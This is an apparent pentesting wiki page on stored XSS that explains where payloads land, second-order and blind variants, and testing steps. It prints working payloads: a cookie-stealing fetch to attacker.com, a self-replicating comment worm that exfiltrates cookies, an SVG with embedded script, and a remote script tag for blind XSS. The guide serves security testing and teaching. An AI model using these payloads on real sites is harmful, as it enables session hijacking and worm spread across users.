# Stored XSS

← [[XSS-Overview]]

---

Stored XSS (also called Persistent XSS) is when your payload is saved in the application's database and executed every time someone views that content. It's more dangerous than reflected XSS — no crafted link needed, and it can affect every user who visits the page.

---

## How It Works

```
1. Attacker submits payload in a form field (comment, username, bio, etc.)
2. App stores it in the database without sanitization
3. Any user who visits the page gets the payload injected into their browser
4. Script executes in the victim's browser context
```

---

## Where to Look

Think about every piece of user-supplied data that gets displayed to other users:

| Feature | Where XSS Could Land |
|---------|---------------------|
| Comments / forum posts | `<script>` in comment body |
| Profile fields (name, bio) | Displayed on profile page |
| Product reviews | Review text |
| Chat messages | Message content |
| File upload filenames | Filename rendered in file list |
| User avatars / images | SVG with embedded JS |
| Support tickets | Ticket body displayed in admin panel |
| Webhook/notification settings | URL displayed back in settings page |
| Log viewers | Log entries containing user input |

> [!TIP]
> **Support tickets and admin-facing features are the most valuable target for stored XSS.** If your payload in a support ticket fires in the admin's browser, you've compromised the admin's session. This elevates stored XSS to critical territory.

---

## SVG Upload XSS

If the app allows SVG file uploads and renders them inline (not as `<img>` tags), SVG files can contain JavaScript:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

Upload this as a profile picture or document. If rendered inline, XSS fires.

---

## The "Second Order" / Stored-but-Displayed-Elsewhere Pattern

The payload is stored in one place but executed in a different, more privileged context.

**Example:**
1. User sets their username to `<script>alert(1)</script>`
2. The profile page properly encodes it — no XSS there
3. The admin user management panel renders usernames without encoding — XSS fires when admin views the list

Look for input that's stored in one context and rendered in another — especially admin interfaces.

---

## Escalation

Stored XSS fires automatically — no need to socially engineer the victim to click a link.

**Mass impact payload:**

```javascript
// This fires for EVERY user who views the page
// If stored in a comment on the homepage — affects everyone
fetch('https://attacker.com/steal?cookie='+btoa(document.cookie)+'&url='+btoa(location.href))
```

**Worm payload (self-replicating XSS):**

```javascript
// Post this as a comment, it reads your session cookie and also posts itself as a new comment
// Can spread across the entire user base
fetch('/api/comments', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    body: '<script>/* same payload */</script>',
  })
}).then(() => fetch('https://attacker.com/?c='+document.cookie))
```

---

## Blind Stored XSS

You submit the payload but never see where it renders. It might fire in:
- Admin dashboard
- Log viewer
- Email notifications (HTML email)
- PDF generation
- Customer service tools

Use a payload that phones home when it fires:

```html
<script src="https://xsshunter.com/YOURPAYLOAD"></script>
```

XSS Hunter (or your own server) captures:
- The URL where it fired
- The victim's cookies
- The page HTML
- Screenshot (with some tools)

---

## Testing Stored XSS

```
For each input field that stores data:
1. Submit: <img src=x onerror=alert(document.domain)>
2. Navigate to every page that might display this data
3. Check if the payload fires
4. Also check: admin views, email notifications, PDF exports, API responses
```

---

*Back to [[XSS-Overview]] | Related: [[Reflected-XSS]] | [[DOM-XSS]]*

*Sources: PortSwigger Web Security Academy, OWASP Testing Guide v4*
